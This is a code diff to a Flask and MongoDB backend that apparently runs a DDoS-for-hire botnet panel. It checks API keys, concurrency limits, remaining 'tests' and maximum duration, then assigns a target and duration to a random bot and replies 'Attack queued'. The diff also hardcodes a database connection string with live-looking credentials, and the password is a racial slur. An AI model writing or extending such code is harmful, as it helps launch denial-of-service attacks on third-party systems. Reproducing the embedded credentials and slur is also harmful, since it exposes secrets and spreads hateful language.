@@ -1,26 +1,23 @@
 from flask import Flask, jsonify
 from pymongo import MongoClient
-import os
-import random
+import os, random
 
 app = Flask(__name__)
 
-MONGO_URI = os.getenv('mongodb+srv://ToughLuck1:nigger@bitnsfw.ytfzx.mongodb.net/?retryWrites=true&w=majority&appName=BitNSFW')
+MONGO_URI = 'mongodb+srv://ToughLuck1:nigger@bitnsfw.ytfzx.mongodb.net/?retryWrites=true&w=majority&appName=BitNSFW'
 client = MongoClient(MONGO_URI)
-db = client['db']
+db = client['api_system']
 
 keys_collection = db['keys']
 bots_collection = db['bots']
 
 def send_command_to_bot(bot, key, target, seconds):
-    bot_id = bot['id']
-    command = {'target': target, 'seconds': seconds}
     bots_collection.update_one(
-        {'id': bot_id},
+        {'id': bot['id']},
         {'$set': {
             'available': False,
             'which_key_is_using': key,
-            'current_command': command
+            'current_command': {'target': target, 'seconds': seconds}
         }}
     )
 
@@ -29,13 +26,10 @@ def api_request(key, target, seconds):
     user = keys_collection.find_one({'key': key})
     if not user:
         return jsonify({'error': 'Invalid API key'}), 403
-
     if user['concurrents'] >= user['concurrents_max']:
         return jsonify({'error': 'Concurrent limit reached'}), 429
-
     if user['tests_left'] <= 0:
         return jsonify({'error': 'No tests remaining'}), 403
-
     if seconds > user['max_seconds']:
         return jsonify({'error': 'Requested duration exceeds maximum allowed'}), 400
 
@@ -45,11 +39,7 @@ def api_request(key, target, seconds):
 
     bot = random.choice(available_bots)
     send_command_to_bot(bot, key, target, seconds)
-
-    keys_collection.update_one(
-        {'key': key},
-        {'$inc': {'tests_left': -1, 'concurrents': 1}}
-    )
+    keys_collection.update_one({'key': key}, {'$inc': {'tests_left': -1, 'concurrents': 1}})
 
     return jsonify({'status': 'Attack queued', 'target': target, 'duration': seconds}), 200
 
